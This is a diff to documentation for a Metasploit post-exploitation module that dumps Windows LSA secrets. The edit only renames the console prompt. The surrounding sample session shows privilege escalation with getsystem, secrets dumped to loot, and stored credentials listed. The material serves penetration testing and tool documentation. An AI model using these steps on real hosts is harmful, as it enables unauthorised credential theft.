@@ -26,7 +26,7 @@ value is a legitimate password, thus you may fill your database with bad values.
 The `DefaultPassword` in this case is legitimate.
 
 ```
-msf6 post(windows/gather/lsa_secrets) > run
+msf post(windows/gather/lsa_secrets) > run
 
 [*] Executing module against MSEDGEWIN10
 [*] Obtaining boot key...
@@ -34,7 +34,7 @@ msf6 post(windows/gather/lsa_secrets) > run
 [*] Vista or above system
 [-] Could not retrieve LSA key. Are you SYSTEM?
 [*] Post module execution completed
-msf6 post(windows/gather/lsa_secrets) > sessions -i 5
+msf post(windows/gather/lsa_secrets) > sessions -i 5
 [*] Starting interaction with 5...
 
 meterpreter > getsystem
@@ -49,7 +49,7 @@ Logged On Users : 2
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 5...
-msf6 post(windows/gather/lsa_secrets) > run
+msf post(windows/gather/lsa_secrets) > run
 
 [*] Executing module against MSEDGEWIN10
 [*] Obtaining boot key...
@@ -70,7 +70,7 @@ msf6 post(windows/gather/lsa_secrets) > run
 [*] Writing to loot...
 [*] Data saved in: /home/h00die/.msf4/loot/20201011171021_default_192.168.2.92_registry.lsa.sec_067749.txt
 [*] Post module execution completed
-msf6 post(windows/gather/lsa_secrets) > creds
+msf post(windows/gather/lsa_secrets) > creds
 Credentials
 ===========
 
